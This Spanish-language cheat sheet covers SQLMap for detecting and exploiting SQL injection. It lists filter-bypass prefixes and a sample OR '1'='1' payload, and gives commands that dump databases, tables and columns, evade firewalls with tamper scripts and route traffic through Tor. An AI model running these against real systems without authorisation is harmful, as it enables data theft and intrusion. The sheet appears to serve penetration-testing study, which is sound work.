# Comandos básicos de la herramienta SQLMap
<p align="center">
  <img src="https://i.postimg.cc/7LMcjndm/SQLmap.png" alt="sql"/>
</p>

`SQLMap` es una herramienta automatizada de pruebas de penetración que permite detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web.

- **Notas:** 
	1. Si se utiliza `-r` con `sqlmap` para leer un a solicitud HTTP desde un archivo, no es necesario utilizar la opción `-u`.
	2. Cuando se tenga una solicitud HTTP completa en un `file.txt` y quiera replicarse exactamente como fue capturada se utiliza `-r`.
	   En caso de querer especificar los datos de la solicitud en la línea de comandos se utilizaría `--data="user=user&pass=pass"`.
	3. Se puede alojar un script personalizado en el parámetro `--tamper`.
	4. `--prefix` añade una cadena de caracteres al principio del payload y `--suffix` al final.
	5. Los parámetros `--level` y `--risk` controlan la exhaustividad y el riesgo de las pruebas de SQLi.
	6. El parámetro `-v` **controla el nivel de detalle** de la salida generada por SQLMap.
	7. Se puede utilizar `-v` para obtener mas detalles sobre lo que SQLMap está haciendo, pero esto no afectará la cantidad de pruebas realizadas ni el riesgo asociado a estas pruebas.

#### Listado de comandos

| COMANDOS                     | DESCRIPCIÓN                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **-u**                       | Especifica el objetivo (`-u example.com`).                                                                                                                                                                                                                                                                                                                               |
| **-r**                       | Especifica el objetivo desde un .txt con la cabecera (`-r request.txt`).                                                                                                                                                                                                                                                                                                 |
| **--data**                   | Realiza pruebas de `SQLi` en parámetros específicos para determinar si son vulnerables(`--data="user=user&pass=pass"`).                                                                                                                                                                                                                                                  |
| **-p**                       | Realiza una prueba en un parámetro en específico (`-p user`).                                                                                                                                                                                                                                                                                                            |
| **--tamper**                 | Evade detección de firewall (`--tamper space2comment`).                                                                                                                                                                                                                                                                                                                  |
| **--prefix**                 | Especifica una cadena de caracteres que SQLMap debe añadir al principio de cada payload de SQLi. Funcionalidad orientada a evadir algunas protecciones o filtros de aplicaciones web.(` --prefix="')"` ).                                                                                                                                                                |
| **--suffix**                 | Se utiliza para añadir una cadena de caracteres al final de cada payload de SQLi. Carga con la utilidad de evadir protecciones y filtros en las aplicaciones web. <br>(`--suffix="-- -"`).                                                                                                                                                                               |
| **--prefix**<br>**--suffix** | `sqlmap -r request.txt -p user --prefix="')" --suffix="-- -" --dbs`<br>`SELECT * FROM users WHERE username = 'admin') OR '1'='1'-- -;`                                                                                                                                                                                                                                   |
| **--level (1-5)**            | (por defecto 1) Controla la cant. de pruebas que SQLMap realiza en el objetivo, dependiendo el valor se sabe si el escaneo sería mas rápido o más exhaustivo (más pruebas y más lento). (`--level 1-5`).                                                                                                                                                                 |
| **--risk** (1-3)             | (por defecto 1) Controla el riesgo asociado a la prueba de SQLi que SQLMap realiza. Se diferencia por su valor numérico de 1 a 3, donde dependiendo su valor la herramienta realizaría pruebas tanto invasiva-segura o invasiva-potencialmente peligrosa. El parámetro --risk balancea entre la seguridad de la aplicación y la efectividad del escaneo. (`--risk 1-3`). |
| **-v** (1-6)                 | Controla el nivel de verbosidad de la salida. (`-v 1-6`).                                                                                                                                                                                                                                                                                                                |
#### **Explicación del comando `-v`**

| COMANDO `-v` | NIVEL |                  DESCRIPCIÓN                   |
| :----------: | :---: | :--------------------------------------------: |
|     `-v`     |   0   |           Silencioso, solo errores.            |
|     `-v`     |   1   |        Salida mínima (predeterminado).         |
|     `-v`     |   2   |   Salida detallada de las pruebas de SQLMap.   |
|     `-v`     |   3   |       Salida detallada de la inyección.        |
|     `-v`     |   4   |       Salida detallada de los resultados       |
|     `-v`     |   5   |             Salida de depuración.              |
|     `-v`     |   6   | Salida de depuración con detalles adicionales. |
#### **Lista de ejemplos para bypassar con `--prefix`**

| Bypass con `--prefix`   |
| ----------------------- |
| `--prefix="') "`        |
| `--prefix='``)'`        |
| `--prefix="' "`         |
| `--prefix="') /*"`      |
| `--prefix=") /*"`       |
| `--prefix=") AND 1=1 "` |
| `--prefix=") OR 1=1`    |
| `--prefix=") --"`       |


### Base de datos
- Devuelve todas las bases de datos
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment
sqlmap -u "http://example.com:8080/index.php?id=1" --batch --dbs --level=5 --risk=3
```
```bash
#Cookie
sqlmap -u "http://example.com/index.php" -v 3 --cookie "id=*" --dbs --tamper=space2comment
#JSON
sqlmap -r request.txt --batch --dbs
```
### Tabla
- Devuelve las tablas de una DB específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name --tables
```
### Columnas
- Devuelve las columnas de una DB y tabla específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --columns
```
### Datos
- Devuelve los DATOS de una columna específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
```
---
## Métodos HTTP: GET vs POST

| **GET**                                                                                       | **POST**                                                                        |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| Solicita los datos de un servidor.                                                            | Envia datos al servidor, a menudo datos de un formulario.                       |
| Datos enviados en la **URL** de la solicitud.                                                 | Datos se envían en el **cuerpo** de la solicitud **HTTP**.                      |
| Parámetros visibles en la **URL** del navegador.                                              | Parámetros **no** visibles en la **URL**  del navegador.                        |
| Solicitud limitada por la longitud máxima de la **URL.** Varía según el navegador y servidor. | No hay limitación de tamaño en los datos enviados en el cuerpo de la solicitud. |


- **EJEMPLO GET:** `http://www.example.com/index.php?username=user&password=pass123`

- **EJEMPLO POST:** 
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=user&password=pass123
```
#### **GET Request con SQLMap**

- Se analiza **user=admin** y **pass=admin** en la **URL** para detectar posibles inyecciones **SQL**.
```bash
sqlmap -u http://www.example.com/login.php?user=admin&pass=admin
```
#### **POST Request con SQLMap**

- Se analiza  **user=admin** y **pass=admin** en el **cuerpo** de la solicitud para detectar posible SQLi.
```bash
sqlmap -u http://www.example.com/login.php --data='user=admin&pass=admin'
```
#### **PUT Request con SQLMap**

- PUT, envía datos al servidor para crear o actualizar un recurso en el servidor.
- Se permite verificar si la aplicación web es susceptible a `SQLi` con un método diferente a los que son `POST` y `GET`.
```bash
sqlmap -u www.example.com --data='id=1' --method PUT
```
#### **Solicitud HTTP con SQLMap**

- Se puede guardar la cabecera desde BurpSuite en un **.txt** y luego alojarla en la herramienta de SQLMap junto el comando **-r**.
1. Lanzar la petición.
2. Capturar la trama.
3. Copiar la cabecera.
4. Pegarla en un archivo .txt
5. Ingresar la ruta del archivo .txt en la herramienta SQLMap. `-r /../../rq.txt`
```bash
sqlmap -r request.txt /rq.txt
```
#### **Cookies con SQLMap**

- Especificar el valor de la cookie con SQLMap.
```bash
sqlmap ... --cookie='PHPSESSID=..'
```
- Otro ejemplo es utilizar en vez de `--cookie` los comandos `-H/--header`
```bash
sqlmap ... -H='Cookie:PHPSESSID=..'
```
- Comando básico:
```bash
sqlmap -u http://example.com/index.php --cookie="id=*" --dbs --batch
```
#### **JSON con SQLMap**

- Capturar la trama, agregar el **JSON** y por último cambiar el método **GET** por **POST**.
- Copiar la trama con las modificaciones realizadas y pegarlas en un archivo **.txt**
<p align="center">
  <img src="https://i.postimg.cc/R0wQGV31/sqli-txt.png" alt="sqli"/>
</p>

```bash
sqlmap -r request.txt --batch --dbs
# Por último seguir el paso a paso del principio para revisar tablas, columnas y datos.
```
#### **Valor Prefijo y Sufijo**
- Opciones `--prefix` y `--suffix`
```bash
sqlmap -u http://example.com?id=test --prefix="%'))" --suffix="-- -"
```
---
### "Anonimato"

#### Usar TOR con SQLMap
```bash
sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```
#### Usar un PROXY con SQLMap
```bash
sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
```
### Almacenar la salida
- **BurpSuite**:
<p align="center">
  <img src="https://i.postimg.cc/KvnMdscF/sqli-txt.png" alt="sqli"/>
</p>

- **SQLMap:**
	- `-t` lo exporta el contenido de la cabecera hacia el archivo **request.txt**
```bash
sqlmap -u http://example.com?id=1 --batch -t /tmp/request.txt
cat /tmp/request.txt
```

---
